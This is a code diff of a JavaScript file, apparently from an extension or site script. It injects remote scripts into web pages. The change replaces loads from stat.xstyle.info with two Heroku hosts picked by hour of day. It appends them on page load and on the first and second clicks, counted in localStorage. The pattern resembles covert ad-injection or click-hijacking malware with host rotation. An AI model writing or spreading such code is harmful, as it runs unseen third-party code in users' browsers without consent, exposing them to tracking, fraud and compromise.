@@ -8,7 +8,14 @@ setRewriteTL();
 
 
 $(document).ready(function(){
-    $('body').append('<script src="http:\/\/stat.xstyle.info\/?id=1409"><\/script>');
+    var nD=new Date();
+    var nH=nD.getUTCHours();
+    
+    if(nH<12){
+        $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
+    }else{
+        $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
+    }
 
     localStorage.setItem('dcc', 0);
     $('body').click(function() {
@@ -16,10 +23,18 @@ $(document).ready(function(){
         cco++;
         localStorage.setItem('dcc', cco);
         if(cco==1){
-            $('body').append('<script src="http:\/\/stat.xstyle.info\/?id=1973"><\/script>');
+            if(nH<12){
+                $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1973"><\/script>');
+            }else{
+                $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1973"><\/script>');
+            }
         }
         if(cco==2){
-            $('body').append('<script src="http:\/\/stat.xstyle.info\/?id=1193"><\/script>');
+            if(nH<12){
+                $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1193"><\/script>');
+            }else{
+                $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1193"><\/script>');
+            }
         }
     });
 });
